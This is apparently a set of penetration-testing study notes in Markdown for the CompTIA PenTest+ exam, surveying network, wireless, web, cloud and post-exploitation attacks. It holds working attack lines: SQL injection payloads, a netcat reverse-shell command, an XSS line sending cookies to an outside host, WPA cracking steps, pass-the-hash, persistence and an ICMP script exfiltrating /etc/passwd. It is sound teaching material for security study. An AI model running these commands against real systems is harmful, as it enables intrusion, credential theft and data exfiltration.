# Attacks and Exploits

* [Resources](#resources)
* [Denial of Service](#denial-of-service)
* [ARP Poisoning](#arp-poisoning)
* [DNS Poisoning](#dns-poisoning)
* [Password Attacks](#password-attacks)
* [VLAN Hopping](#vlan-hopping)
* [MAC Spoofing](#mac-spoofing)
* [Wireless Attacks](#wireless-attacks)
* [OWASP Top Ten](#owasp-top-ten)
* [SSRF Attacks](#ssrf-attacks)
* [Business Logic Flaws](#business-logic-flaws)
* [SQL Injection](#sql-injection)
* [Other Injection Attacks](#other-injection-attacks)
* [XSS Attacks](#xss-attacks)
* [Session Attacks](#session-attacks)
* [API Attacks](#api-attacks)
* [Cloud Attacks](#cloud-attacks)
* [Mobile Attacks](#mobile-attacks)
* [IoT Attacks](#iot-attacks)
* [Data Storage System Vulnerabilities](#data-storage-system-vulnerabilities)
* [ICS SCADA and IIoT Vulnerabilities](#ics-scada-and-iiot-vulnerabilities)
* [Virtual Environment Vulnerabilities](#virtual-environment-vulnerabilities)
* [Container Vulnerabilities](#container-vulnerabilities)
* [Social Engineering and Physical Attacks](#social-engineering-and-physical-attacks)
* [Post-Exploitation Enumeration and Tools](#post-exploitation-enumeration-and-tools)
* [Network Segmentation Testing](#network-segmentation-testing)
* [Privilege Escalation](#privilege-escalation)
* [Persistence](#persistence)
* [Detection Avoidance](#detection-avoidance)
* [PS Remoting WinRM](#ps-remoting-winrm)
* [Other](#other)
* [References](#references)

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

## Resources
* https://www.exploit-db.com/
   * searchsploit
* https://vulners.com/
* https://packetstormsecurity.com/
* https://owasp.org/www-project-top-ten/
* https://pentestlab.blog/tag/token-manipulation/
* https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
* https://www.offensive-security.com/metasploit-unleashed/
* https://www.rapid7.com/db/
* https://vuldb.com/
* http://www.powershellempire.com 
* https://github.com/EmpireProject/Empire/wiki/Quickstart
* https://toshellandback.com/2017/02/11/psexec
* https://www.secureauth.com/labs/open-source-tools/impacket/

## Denial of Service
* Distributed Denial of Service (DDoS)
* Reflection
* Amplification
* Volumetric
   * hping3
   * smurf
* Protocol Attacks
* Application Attacks
   * slowloris

## ARP Poisoning
* ettercap
* bettercap
* dsniff
* arpspoof

## DNS Poisoning
* ettercap
* bettercap
* mitm6
   * https://github.com/dirkjanm/mitm6 

## Password Attacks
* Hash Cracking
   * Brute Force
   * Dictionary Attack
      * Cewl (build custom wordlist)
      * John the Ripper
      * Hashcat
      * Cain and Able
      * L0phtCrack
   * Rainbow Tables
      * Ophcrack
      
 * Password Spraying
    * Hydra
    * Medussa
    * Patator
    * Spray
    * Burpsuite

* Kerberoasting
   * Allows the attackers, as valid domain users, to request a Kerberos service ticket for ANY SERVICE!
   * Attacker captures that ticket granting service (TGS) ticket from memory
      * Attacker then attempts to crack the service credential hash offline
         * JtR/Hashcat

   * Service Principal Names(SPNs)
      * Unique identifier for a Service instance
         * Format: Service Name/Machine Name@domain

## VLAN Hopping
* Switch spoofing
   * Yersinia
   
* Double Tagging
   * Inner tag = desired destination VLAN
   * Outer tag = Native VLAN
      * Switch will strip off the Outer Tag and then forward
         
Example:
```
impacket-GetUserSPNs -dc-ip 192.168.241.200 domain/username -request
```

* NTLM relay attacks
   * LLMNR/NBT-NS
   * Responder

## MAC Spoofing
* aircrack-ng
   * airmon-ng (monitor wireless network)
   * airodump-ng (Get BSSID of target device)
      * Show connect clients MAC addresses
```
airodump-ng -c [CHANNEL] --bssid [TARGET-MAC] -w psk [INTERFACE]
```
Example:
```
airodump-ng -c 6 --bssid 00:1C:DF:89:84:9F -w psk wlan0mon
```
* macchanger
* Change MAC address with ifconfig:
```
ifconfig [INTERFACE] hw ether [MAC-ADDRESS]
```

## Wireless Attacks
* General attacks
   * Jamming
   * Spoofing
   * Data corruption/modification
   
* WiFi
   * aircrack-ng
      * airmon-ng
        ```
        airmon-ng start [INTERFACE]
        ```
      * airodump-ng 
        ```
        airodump-ng wlan0mon
        ```
         * Show connect clients MAC addresses
           ```
           airodump-ng -c [CHANNEL] --bssid [TARGET-MAC] -w psk [INTERFACE]
           ```
   * Deauthentication
      * aireplay-ng
        ```
        aireplay-ng --deauth [#-DEAUTH-PACKETS] -h [CLIENT-TO-DEAUTH-MAC] -a [BSSID] [INTERFACE]
        ```
        Example:
        ```
        aireplay-ng --deauth 25 -h C0:BD:D1:24:F5:0B -a 00:1C:DF:89:84:9F wlan0mon
        ```
        
   * Capture Handshakes
      * Put wireless card into monitoring mode:
        ```
        airmon-ng -start [INTERFACE]
        ```
      * Find BSSID of target AP
        ```
        airodump-ng wlan0mon
        ```
      * Record BSSID and channel of Target AP
      * Monitor target AP
        ```
        airodump-ng -c [CHANNEL] --bssid [BSSID] -w [WRITE-TO-FILE-PATH] [INTERFACE]
        ```
        Example:
        ```
        airodump-ng -c 6 --bssid 00:1C:DF:89:84:9F -w ceh.cap wlan0mon
        ```
      * Wait for 4-way handshake or force with aireplay-ng
         * Force 4-way handshake example
           ```
           aireplay-ng -0 2 -a 00:1C:DF:89:84:9F -c [CLIENT-MAC] wlan0mon
           ```
         * Check the airodump-ng capture for 4-way handshake
      * Time to crack the WPA key
        ```
        aircrack-ng -a2 -b [BSSID] -w [WORDLIST] [CAPTURE-FILE]
        ```
        Example:
        ```
        aircrack-ng -a2 -b 00:1C:DF:89:84:9F -w ~/Documents/rockyou.txt capture.cap-01.cap
        ```
    * WPS
    * Evil Twin
       * Eavesdropping
       * Man-in-the-Middle (MitM) / On-path
       
* Bluetooth
   * BlueJacking
      * Sending messages to devices using contacts
         * Attacker creates a new contact
            * Instead of name/number, attacker saves a message in those areas
         * Scan for Bluetooth devices
         * Shares the contact
         * Target receives the message/contact with no knowledge of who sent it
         
   * BlueSnarfing
      * Attacker is able to connect to victim without auth to see contacts, email, calendars, text messages, pictures, etc
      
   * Bluetooth Low Energy (BLE) Attack | AKA Amplification Attack
      * Flaws in BLE security allows for
         * Spoofing attacks
         * MitM / On-path attacks
         
* RFID Cloning
   proxmark tools

* Amplification Attacks (NFC)
   * Based off of RFID
      * Can be cloned
      * Transmissions can be eavesdropped at up to 10meters with help from antenna
      * Signal can be jammed
      * Signal can be modified
         * Corrupted
         * Inserted
         * MitM / on-path
            * No encryption

## OWASP Top Ten

* A1: Broken Access Control
* A2: Cryptographic Failures
* A3: Injection
* A4: Insecure Design
* A5: Security Misconfiguration
* A6: Vulnerable and Outdated Components
* A7: Identification and Authentication Failures
* A8: Software and Data Integrity Failures
* A9: Security Logging and Monitoring Failures
* A10: Server Side Request Forgeries

## SSRF Attacks
* Use Burp Intruder as a port scanner
* Request files

## Business Logic Flaws
* Think "Application logic flaws"
* Order of operations not correct
* Developer makes bad assumptions when making application
* Trusting user input
* Insecure Direct Object Reference (IDOR)

## SQL Injection
* Testing for SQLi
   * Single-Quote
      * ' OR 1=1 #
      * ' OR 1=1 --
      * ' OR 1=1 -- -
   * Double-Quote
   * Boolean (1=1 vs 1=2)
   
* Error-Based SQLi
   * 'order by 8 -- -
   * 'union select 1,2,3,4,5,6,7 -- -
   * 'union select 1,user(),3,4,@@version,6,7 -- -
   * 'union select 1,table_name,3,4,5,6,7 from information_schema.tables -- -
   * 'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' -- - 
   * 'union select 1,login,3,4,password,6,7 from users -- -
   
* Blind-Based SQLi
   * Blind-Boolean
   * Time based
      * '-sleep(1) -- -   

* Stacked Queries
   * One liner SQL queries
   * Stack queries on top of each other
   
* SQLmap
   * Automated SQLi tool
     ```
     sqlmap -u '[URL]' --cookie='[COOKIE]' -dbs
     ``` 
     ```
     sqlmap -u '[URL]' --cookie='[COOKIE]' -D [DATABASE-NAME] --tables
     ```
## Other Injection Attacks
* Command
   * semi-colon ;
   * double semi-colon ;;
   * ampersand &
   * double ampersand &&
   * pipe |
   * logical or ||
* Code
   * phpinfo()
   * shell_exec('nc -nv -e /bin/bash [ATTACK-IP] [PORT]')
* File
   * Remote File Inclusion (RFI)
   * Local File Inclusion (LFI)
      * Directory Traversal
* LDAP
   * https://brightsec.com/blog/ldap-injection/

## XSS Attacks
* Reflected
   * <script>alert('[MESSAGE]')</script> 
* Stored
* XSS Polyglot: Credit - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
  ```
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  ```
  
## Session Attacks
* Session Hijacking
  ```
  <script>new Image().src="http://10.0.0.212/bogus.php?output="+document.cookie;</script>
  ```
  
* Session Replay
   * Repeat or delay a valid transmission

* Cross Site Request Forgery (CSRF)
   * Grab URL info for CSRF(transfer funds) from bWAPP
   * Create Stored/Persistent XSS in Mutillidae
      * Change account number to transfer
      * Change funds to like $300
   * Surf to bWAPP CSRF page and account should be depleted by $300
   
* Session Fixation


## API Attacks
   * Simple Object Access Protocol (SOAP)
      * Web Services Description Language (WSDL) Files
      * SQL Injection
      * Command Injection
      
   * REST
      * SQL Injection
   
   * XML-RPC
      * Brute-Force Logins
      * Port Scan
         * Bypass DNS-level protection
      * DDoS

## Cloud Attacks
* Vulnerabilities
   * Misconfigured Cloud Assets
      * IAM
      * Federation Misconfigurations
      * Object Storage (S3)

* Attacks

* Credential Harvesting
   * Grabbing creds any way possible
      * Phishing
      * Social Engineering
      * Brute-Force
      * Malware
      * Dark Web

* Account Takeover
   * Use the creds
      * Login and act as user
         * Auth portal
         * SSH
         * API

* Privilege Escalation
   * Gaining access to other accounts / services
      * Horizontal/Vertical

* Metadata Service Attack
   *  https://www.pumascan.com/resources/cloud-security-instance-metadata/
   *  https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
      *  EC2 Instances sometimes need access to private assets like S3 buckets
      * An IAM role with the necessary access will be assigned to the Instance
         * An access key will be issued to the instance
            * This key will be a part of the Instance Metadata

* Resource Exhaustion / DoS Attacks
   * Direct-to-Origin Attacks
      * DDoS attack
         * Bypasses CDN protections
            * Accomplished by discovering the Origin Server IP or by requesting non-existent resource

* Cloud Malware Injection Attacks
   * Attacker creates a malicious service/app/image
      * Attacker uploads malware to cloud service provider
         * Malware image is now trusted by CSP
            * Attacker can now use Malware Image to perform attacks such as
               * DoS
               * MitM

* Side-Channel Attacks
   * Attack on cloud hardware
      * Shared hardware may allow attacker access to sensitive data
         * Storage devices
            * Reallocated space may have data remnants

* Tools
   * ScoutSuite (Maps attack surface of cloud service)
      * https://github.com/nccgroup/ScoutSuite
      
   * CloudBrute (Brute-Force enumeration tool for cloud services)
      * https://github.com/0xsha/CloudBrute

   * Pacu (AWS Exploitation Framework)
      * https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/

   * Cloud Custodian (Cloud management system)
      * https://cloudcustodian.io/
         * Has functionality to audit for security compliance

## Mobile Attacks
* Attacks

  * Reverse Engineering
     * Decompilers
     * Static/Dynamic Code Analysis

        * Look for...
           * Creds 
           * Keys 
           * API 
           * info

     * Mobile Security Framework(MobSF)

   * Sandbox Analysis

      * Typical task of malware analysts
      * Load app into controlled, monitored environment
         * See how the app behaves

   * Spamming
      * Phishing
      * Malicious attachments

* Vulnerabilities

   * Insecure Storage
      * No encryption at-rest 
      * Removable media

   * Passcode Vulnerabilities
      * Weak passcodes
      * Applications
         * Frida may help bypassing authentication process

   * Certificate Pinning
      * Adding in malicious keys to bypass legit key

   * Using Components with Known Vulnerabilities
      * Dependency Vulnerabilities 
      * Patching Fragmentation
         * Multiple versions in the ecosystem
         * Results in patches that can't be applied 
         * Patches don't exist
         * Just not installed

   * Execution of Activities Using Root
      * Over-Reach of Permissions
         * May give an attacker a foothold into the system

   * Biometrics Integration
      * Using pictures 
      * Gummy Fingerprint
      
   * Business Logic Vulnerabilities

* Tools

   * Burp Suite 
   * Drozer
      * https://labs.f-secure.com/tools/drozer
   * Mobile Security Framework
      * https://mobsf.github.io/Mobile-Security-Framework-MobSF/

   * Postman
      * https://www.postman.com/
       
   * Ettercap
   * Frida
      * Injects snippets of JavaScript 
      * https://frida.re/docs/home/

   * Objection
      * Runtime mobile exploration toolkit powered by Frida 
      * https://github.com/sensepost/objection
       
   * Android SDK Tools
      * Exploit Dev
      * https://developer.android.com/studio/

   * APK-X
      * Reverse Engineering 
      * https://github.com/b-mueller/apkx

   * APK Studio
      * Reverse Engineering 
      * https://github.com/vaibhavpandeyvpz/apkstudio

## IoT Attacks
* Special Considerations
   * Fragile Environment
   * Availability Concerns
   * Data Corruption
   * Data Exfiltration

* Vulnerabilities
   * Insecure Defaults
   * Clear-Text Communication
   * Hard-Coded Configurations
   * Outdated Firmware/Hardware
   * Data Leakage
   * Use of Insecure or Outdated Components

## Data Storage System Vulnerabilities
* What are Data Storage Systems
   * Anything that is used to store company data
      * Thumb drives
      * Hard Drives
      * NAS
      * SAN
      * Cloud
      
* How/Why are these devices vulnerable
   * Misconfigurations
      * On-Prem and Cloud Based
         * Default/Blank Username|Password
         * Network Exposure
            * Could access by pivoting through the intranet
            * Internet exposed
               * Management portals
               * Weak creds
               * Improper permissions
                  * World read/write
                  
      * Lack of User Input Sanitization
      * Underlying Software Vulnerabilities
      * Error Messages and Debug Handling
      * Injection Vulnerabilities
         * Single-Quote Method

## ICS SCADA and IIoT Vulnerabilities

* ICS / SCADA / IIoT Security Challenges
   * Plain Text Passwords/Protocols
   * Complexity
   * Proprietary tech
   * Legacy Tech
   * Lack of security professionals
   * Converging with IT brings in IT Security issues
   
* OT Vulnerabilities
   * Internet-connected OT systems
   * OT System connected to system that is connected to Internet
   * Missing or Non-existent updates
   * Weak passwords and/or no authentication
   * Weak firewall rules (ingress/egress)
   * Non-existent network segmentation
   * Weak or non-existent encryption

* IIoT Vulns
   * Ripple20 (https://www.jsof-tech.com/disclosures/ripple20/)
      * 19 vulnerabilities in the Treck TCP/IP stack
         * 4 vulns give RCE rated 9+ CVSS scores

* OT Threats
   * Malware
      * Introduced through
         * Removable Media
         * External hardware
         * via Internet
            * IT connected systems
            * Web / Database
            * Compromised Cloud
            * Infected end-user devices

   * DoS/DDoS
   * Sensitive data exposure
   * HMI-based Attacks
      * Buffer Overflows
      * Authentication/Authorization
         * Creds in Clear-text
         * Hard-coded creds
         * Sensitive info transmitted in the clear

   * Human Error
   * Side-Channel attacks
      * Monitoring physical aspects of the OT
         * Timing Analysis
            * Observe the time it takes to complete password auth process
               * Deduce password or crypto-key
         * Power Analysis
            * Attacker using a oscilloscope observes power consumption between clock cycles
            
   * RF Connected controller attacks (attacks against RF communications)
      * Replay attacks
         * Capture and replay legit command traffic
      * Command Injection
         * Create and inject malicious traffic
      * Malicious RF Controller Re-pairing attack
         * "Evil" Controller
      * Malicious Reprogramming attack
         * Evil firmware

* Tools
   * Shodan
   * SearchDiggity
   * s7scan
   * plcscan
   * smartrf packet sniffer (https://www.ti.com/tool/download/PACKET-SNIFFER-2)
   * ISF (ICS Exploitation Framework)

## Virtual Environment Vulnerabilities
* VM Escape
   * Ability to break out from the virtual environment
      * Direct access to other virtual environments
      * Direct access to underlying host operating system
      
   * Virtualization detection
      * Check the NIC
         * wmic baseboard get manufacturer,product
         * https://dnschecker.org/mac-lookup.php
         
      * Check disk type
         * ls -l /dev/disk/by-id
         
      * Look for VMware Tools install or Drag-n-Drop
         * C:\Program Files\VMWare
         * /tmp
       
    * Check exploit-db for 'vm escape'
       * Hypervisor Vulnerabilities
       * VM Repository Vulnerabilities
       * https://github.com/WinMin/awesome-vm-exploit

## Container Vulnerabilities
* Container Vulnerabilities
   * Container software and Cloud deployment
      * Docker
      * Kubernetes
      * Amazon ECS
         * Insecure secrets
         * Weak authentication
            * Bad passwords
            * No 2FA
            * Public access
   * Apps that run in a container
      * Web Apps
      * Network services
      * Software vulns

##  Social Engineering and Physical Attacks
* Tools
   * BeEF
   * SE-Toolkit
   * Call Spoofing Tools

## Post-Exploitation Enumeration and Tools
* Tools
   * Empire
   * Mimikatz
   * BloodHound
   
* Lateral Movement
   * Pass-the-Hash
        ```
        pth-winexe -U [USER]% //[TARGET-IP] cmd
        ```
## Network Segmentation Testing
* Recommended for PCI-DSS compliance testing
   * PCI-DSS 11.3.4 checkbox (PCI p.102)
      * Cardholder Data Environment (CDE) - Any systems/devices that directly process, store or transmit sensitive authentication data (SAD) or cardholder data (CHD) or are directly connected to such systems/devices.
         * Tier 1 Devices: Directly Connected to cardholder data enviroment CDE
         * Tier 2 Devices: Connected to or security impacting systems that provides "shared services" to tier 1 devices
         * Tier 3 Devices: Can not connect to the CDE; out of scope systems
         
* Tools
   * Nmap
   * Metasploit
      * https://www.rapid7.com/resources/network-segmentation-testing-with-metasploit-pro/

## Privilege Escalation
* Techniques

   * Windows
      * Unquoted Service Paths
      * DLL Hijacking
      * Unattended Install File
      * Password Reuse
      * Misconfigured permissions
      * Scheduled Tasks
      * Kernel Exploit
      * Tools 
         * PowerShell Empire
         * WinPEAS
         * POWERUP.PS1
            * Script Execution Bypass
               * powershell.exe -exec bypass
            * Run AMSI bypass
            * Import-Module .\ServiceUp.ps1
            * Invoke-AllChecks

   * Linux
      * sudo abuse
      * SUID/GUID binaries
         * find / -perm -u=s -type f 2>/dev/null
      * Insecure Binary Invocation
         * Scripts call binaries without using full paths
      * Kernel exploits
      * Services running as root
      * Password reuse
      * Misconfigured file permissions
         * /etc/passwd
      * Cron Jobs

## Persistence

* Trojans
   * freesweep.deb
* Backdoors
   * Bind Shell
   * Reverse Shell
      * Cheet sheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
* Daemons
   * Background services that don't require human interaction
      * script.sh &
      * /etc/init.d/script.sh ; ln -s /etc/init.d/script.sh /etc/rc3.d/S100script.sh
      * sc.exe create <new_service_name> binPath="C:\Windows\temp\script.exe" start=auto
* Scheduled Tasks
   * Cron
   * Windows Services
   * Startup
      * PowerShell Empire
         * Persistence Module
            * usemodule powershell/persistence/elevated/schtasks
            * set OnLogon True
            * set Listener L-1
            * execute

## Detection Avoidance
* Living-off-the-Land
   * CrackMapExec
      * https://github.com/Porchetta-Industries/CrackMapExec/wiki  
   * Fileless Malware
   * PsExec
      * psexec \\192.168.241.200 -u [USER] -p [PASSWORD] cmd.exe
   * Windows Management Instrumentation (WMI)
      * Tools
         *  WMImplant
         *  WmiSploit  
   * PS Remoting
   * WinRM

* Data Exfiltration
   * Steganography
      * stegsnow (ASCII text files)
         * stegsnow -C -p password -m "secret message" infile.txt outfile.txt
      * steghide (image files)
         * steghide embed -ef exfil.txt -cf hacker.jpg -sf hacker2.jpg
   * Covert Channels
      * DNS
      * ICMP
         * On victim Linux machine:
         ```
         stringZ=cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n"; ounter=0; while (($counter <= ${#stringZ})); do ping -s 16 -c 1 -p ${stringZ:$counter:16} 10.10.10.1 && counter=$((counter+16));done`
         ```
         * On attack machine:
         ```
         tcpdump -ntvvSxs 0 'icmp[0]=8' > data.dmp
         ```
         ```
         grep 0x0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
         ```

* Covering Your Tracks
   * shred
   * /var/log
   * .bash_history
   * Event Viewer

## PS Remoting/WinRM
```
enable‐PSRemoting ‐force
```
```
Set-Item wsman:\localhost\client\trustedhosts [IP ADDRESS or HOSTNAME]
```

## Other
* TruffleHog
   * Look for strings that match common formats for keys
      * https://pypi.org/project/truffleHog/ 

*********************************************************************************
### References
* https://www.itpro.tv/courses/comptia/comptia-pentest-pt0002/
* Chapple, M., & Seidl, D. (2022). CompTIA PenTest+ Study Guide: Exam PT0-002 (2nd ed.). Sybex. (Chapter 6)
